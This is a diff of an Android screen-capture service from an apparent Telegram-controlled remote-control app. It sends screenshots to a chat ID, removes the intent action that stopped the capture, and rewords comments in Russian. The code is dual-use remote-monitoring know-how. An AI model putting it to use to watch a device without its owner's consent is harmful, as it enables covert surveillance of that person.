@@ -22,7 +22,6 @@ public class ScreenCaptureService extends Service {
     public static final String EXTRA_RESULT_CODE = "result_code";
     public static final String EXTRA_RESULT_DATA = "result_data";
     public static final String EXTRA_CHAT_ID = "chat_id";
-    public static final String ACTION_STOP = "com.remotecontrol.STOP_CAPTURE";
 
     private MediaProjectionManager projectionManager;
     private MediaProjection mediaProjection;
@@ -38,11 +37,6 @@ public class ScreenCaptureService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent == null) return START_NOT_STICKY;
 
-        if (ACTION_STOP.equals(intent.getAction())) {
-            stopSelf();
-            return START_NOT_STICKY;
-        }
-
         startForeground(NOTIF_ID, buildNotification());
 
         int resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED);
@@ -52,10 +46,10 @@ public class ScreenCaptureService extends Service {
         if (resultCode == Activity.RESULT_OK && data != null) {
             mediaProjection = projectionManager.getMediaProjection(resultCode, data);
             
-            // Инициализируем захват
+            // Инициализируем ScreenCapture
             ScreenCapture.initProjection(mediaProjection, this);
 
-            // Сразу делаем скриншот через движок
+            // Вызываем захват
             TelegramService svc = TelegramService.getInstance();
             if (svc != null && chatId != 0) {
                 ScreenCapture.captureWithExistingProjection(this, chatId, svc.getEngine());
@@ -69,7 +63,8 @@ public class ScreenCaptureService extends Service {
 
     @Override
     public void onDestroy() {
-        ScreenCapture.release(); // Очищаем ресурсы в ScreenCapture
+        // Очищаем ресурсы в статическом классе
+        ScreenCapture.release();
         if (mediaProjection != null) {
             mediaProjection.stop();
             mediaProjection = null;
@@ -83,7 +78,7 @@ public class ScreenCaptureService extends Service {
     private Notification buildNotification() {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("Screen Capture")
-                .setContentText("Захват экрана активен")
+                .setContentText("Захват экрана...")
                 .setSmallIcon(android.R.drawable.ic_menu_camera)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .build();
